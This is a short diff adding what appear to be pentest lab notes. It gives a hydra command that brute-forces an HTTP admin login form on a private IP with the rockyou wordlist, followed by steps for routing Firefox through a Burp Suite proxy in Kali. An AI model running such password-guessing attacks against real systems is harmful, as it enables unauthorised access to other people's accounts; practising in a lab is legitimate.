@@ -1,0 +1,15 @@
+sudo hydra -L Desktop/usernames.txt -P /usr/share/wordlists/rockyou.txt -u -f 192.168.153.1 -s 8000 http-post-form "/admin/login:username=^USER^&password=^PASS^:f=<form id='login-form'"
+
+firefox browser search result
+
+network settings
+
+Select Manual Proxy Configuration
+
+HTTP Proxy 127.0.0.1
+
+PORT 8080
+
+
+Open Burpsuit
+Kali -> Web Application Analysis -> burpsuite
